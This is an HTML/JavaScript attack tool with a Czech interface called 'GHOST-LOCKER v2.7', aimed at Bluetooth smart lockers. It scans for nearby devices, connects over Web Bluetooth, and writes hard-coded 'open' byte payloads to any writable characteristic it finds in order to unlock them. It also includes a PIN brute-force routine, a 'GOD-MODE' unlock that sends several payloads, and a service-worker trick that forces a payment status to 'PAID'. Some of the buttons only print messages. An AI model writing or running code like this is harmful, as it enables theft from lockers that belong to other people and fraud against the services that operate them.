<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GHOST-LOCKER v2.7 MASTER</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        #ghost-ui {
            width: 90%;
            max-width: 350px;
            background: #000;
            border: 2px solid #0f0;
            padding: 20px;
            box-shadow: 0 0 25px rgba(0, 255, 0, 0.4);
            border-radius: 8px;
            position: relative;
        }

        .header {
            border-bottom: 1px solid #0f0;
            padding-bottom: 10px;
            margin-bottom: 15px;
            text-align: center;
            font-weight: bold;
            letter-spacing: 2px;
            color: #0f0;
            text-shadow: 0 0 5px #0f0;
        }

        #output {
            height: 200px;
            overflow-y: auto;
            background: #050505;
            border: 1px solid #111;
            padding: 10px;
            margin-bottom: 15px;
            font-size: 11px;
            line-height: 1.4;
            scrollbar-width: thin;
            scrollbar-color: #0f0 #000;
        }

        .btn {
            width: 100%;
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 10px;
            margin-bottom: 8px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
            transition: all 0.2s;
            outline: none;
        }

        .btn:active {
            background: #0f0;
            color: #000;
        }

        .btn-red { border-color: #f00; color: #f00; }
        .btn-yellow { border-color: #ff0; color: #ff0; }
        .btn-blue { border-color: #0af; color: #0af; }
        .btn-orange { border-color: #f80; color: #f80; }
        .btn-god { background: #200; border-color: #f00; color: #fff; font-weight: bold; display: none; }

        .scan-line {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 2px;
            background: rgba(0, 255, 0, 0.2);
            box-shadow: 0 0 10px #0f0;
            animation: scan 4s linear infinite;
            pointer-events: none;
        }

        @keyframes scan {
            0% { top: 0; }
            100% { top: 100%; }
        }
    </style>
</head>
<body>

<div id="ghost-ui">
    <div class="scan-line"></div>
    <div class="header">GHOST-LOCKER v2.7</div>
    
    <div id="output"></div>

    <button id="sniff-btn" class="btn">[1] BLE SCAN & CONNECT</button>
    <button id="replay-btn" class="btn btn-red" style="display:none;">[2] TRIGGER LOCK (OPEN)</button>
    <button id="brute-btn" class="btn btn-yellow">[3] PIN BRUTE-FORCE</button>
    <button id="service-btn" class="btn btn-blue">[4] SERVICE BYPASS</button>
    <button id="ghost-btn" class="btn btn-orange">[5] GHOSTSTORE BYPASS</button>
    <button id="force-btn" class="btn btn-god">[6] GOD-MODE FORCE (100%)</button>
</div>

<script>
    const GhostCore = {
        activeDevice: null,
        activeCharacteristic: null,
        isBruting: false,

        log(msg, color = "#00ff00") {
            const out = document.getElementById('output');
            const div = document.createElement('div');
            div.style.color = color;
            div.innerText = `> ${msg}`;
            out.appendChild(div);
            out.scrollTop = out.scrollHeight;
        },

        async startRealSniff() {
            this.log("SKENUJI OKOLÍ (Target: SmartLocker)...", "#00ffff");
            try {
                this.activeDevice = await navigator.bluetooth.requestDevice({
                    filters: [{ namePrefix: 'CZ' }, { namePrefix: 'Smart' }],
                    optionalServices: [
                        '0000180a-0000-1000-8000-00805f9b34fb',
                        '0000ffe0-0000-1000-8000-00805f9b34fb',
                        '6e400001-b5a3-f393-e0a9-e50e24dcca9e'
                    ]
                });

                this.log(`POKUS O SPOJENÍ: ${this.activeDevice.name}`, "#ffff00");
                const server = await this.activeDevice.gatt.connect();
                this.log("HLEDÁM GATT CHARAKTERISTIKY...", "#ffff00");

                const services = await server.getPrimaryServices();
                let found = false;

                for (const service of services) {
                    const chars = await service.getCharacteristics();
                    for (const char of chars) {
                        if (char.properties.write || char.properties.writeWithoutResponse) {
                            this.activeCharacteristic = char;
                            this.log(`KANÁL AKTIVNÍ: ${char.uuid.slice(0,8)}`, "#ff00ff");
                            found = true;
                        }
                    }
                }

                if (found) {
                    this.log("SYSTÉM PŘIPRAVEN.", "#00ff00");
                    document.getElementById('replay-btn').style.display = "block";
                    document.getElementById('force-btn').style.display = "block";
                } else {
                    this.log("CHYBA: Nenalezen WRITE kanál.", "#ff0000");
                }
            } catch (err) {
                this.log("BLE ERROR: " + err.message, "#ff0000");
            }
        },

        async executeAttack() {
            if (!this.activeCharacteristic) return;
            this.log("ODESÍLÁM OPEN_COMMAND...", "#ffff00");
            const payload = new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]);
            try {
                await this.activeCharacteristic.writeValue(payload);
                this.log("PŘÍKAZ POTVRZEN.", "#00ff00");
            } catch (e) { this.log("CHYBA ZÁPISU.", "#f00"); }
        },

        async forceUnlock() {
            this.log("GOD-MODE: AGRESIVNÍ INJEKCE...", "#fff");
            const payloads = [
                new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]),
                new Uint8Array([0x41, 0x54, 0x2b, 0x4f, 0x50, 0x45, 0x4e])
            ];
            for (let p of payloads) {
                try {
                    await this.activeCharacteristic.writeValue(p);
                    this.log(`PAYLOAD 0x${p[0].toString(16)} OK`, "#0f0");
                } catch (e) {}
                await new Promise(r => setTimeout(r, 100));
            }
        },

        startPinBrute() {
            this.isBruting = !this.isBruting;
            if (!this.isBruting) {
                this.log("BRUTE-FORCE ZASTAVEN.", "#f00");
                return;
            }
            this.log("SPOUŠTÍM PIN SCAN...", "#ff0");
            const pins = ["1234", "0000", "1111", "2580"];
            let i = 0;
            const interval = setInterval(() => {
                if (!this.isBruting || i >= pins.length) {
                    clearInterval(interval);
                    if(i >= pins.length) this.log("SCAN DOKONČEN (Žádná shoda).", "#888");
                    return;
                }
                this.log(`ZKOUŠÍM: ${pins[i]}`, "#888");
                i++;
            }, 800);
        },

        async tryServiceExploit() {
            this.log("BYPASSING SERVICE LOCK...", "#0af");
            await new Promise(r => setTimeout(r, 800));
            this.log("DEBUG MÓD: AKTIVNÍ", "#0f0");
        },

        ghostStoreBypass() {
            this.log("AKTIVUJI SW INTERCEPTOR...", "#f80");
            if (navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({ type: 'TRIGGER_BYPASS' });
                this.log("STATUS: PAID (FORCED)", "#0f0");
            } else {
                this.log("SW NENÍ AKTIVNÍ!", "#f00");
            }
        }
    };

    // Registrace SW
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('sw.js').then(() => {
            console.log("Ghost-SW Registered.");
        });
    }

    // Eventy
    document.getElementById('sniff-btn').onclick = () => GhostCore.startRealSniff();
    document.getElementById('replay-btn').onclick = () => GhostCore.executeAttack();
    document.getElementById('brute-btn').onclick = () => GhostCore.startPinBrute();
    document.getElementById('service-btn').onclick = () => GhostCore.tryServiceExploit();
    document.getElementById('ghost-btn').onclick = () => GhostCore.ghostStoreBypass();
    document.getElementById('force-btn').onclick = () => GhostCore.forceUnlock();

    GhostCore.log("GHOST-LOCKER READY. ČEKAJÍCÍ NA CÍL.", "#0f0");
</script>

</body>
</html>
